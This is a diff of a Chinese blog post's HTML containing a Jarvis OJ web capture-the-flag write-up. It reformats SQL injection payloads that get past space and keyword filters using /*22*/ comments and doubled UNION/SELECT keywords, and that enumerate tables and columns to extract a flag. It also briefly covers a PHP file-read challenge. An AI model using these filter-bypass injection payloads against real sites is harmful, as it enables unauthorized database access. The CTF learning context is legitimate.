@@ -161,7 +161,7 @@
 <p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" title="image">
 
-<p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\ <br>才能到file_get_contents函数读取文件</p>
+<p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\\<br>才能到file_get_contents函数读取文件</p>
 <p>又读了一下showimg.php</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" title="image">
 
@@ -188,7 +188,7 @@
 <p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" title="image">
 
-<p>确实是sql注入<br>可以看到它这里是过滤了空格 用/<em>22</em>/绕过 回显又正常了</p>
+<p>确实是sql注入<br>可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" title="image">
 
 <p>先测试字段数</p>
@@ -197,42 +197,22 @@
 <p>说明字段为3</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" title="image">
 
-<p>双写绕过对select和union的过滤<br>数据库名<br>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,database()</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image15.png" title="image">
+<p>双写绕过对select和union的过滤<br>数据库名</p>
+<pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre>{% asset_img Image15.png  image %}
 
 <p>表名</p>
-<p>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(table_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.tables/<em>22</em>/where/<em>22</em>/table_schema=database()</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" title="image">
+<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" title="image">
 
 <p>列名</p>
-<p>？id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(column_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.columns/<em>22</em>/where/<em>22</em>/table_schema=database()/<em>22</em>/and/<em>22</em>/table_name=0x636f6e74656e74</p>
-<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image17.png" title="image">
+<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre>{% asset_img Image17.png  image %}
 
-
-<p>id=-1/<em>22</em>/uniunionon/<em>22</em>/seleselectct/<em>22</em>/1,2,context/<em>22</em>/frofromm/<em>22</em>/content</p>
-<p>得到flag</p>
+<pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" title="image">
 
-<p>持续更新</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
+
+<p><strong>持续更新</strong></p>
+
             </div>
 
             <!-- Post Comments -->
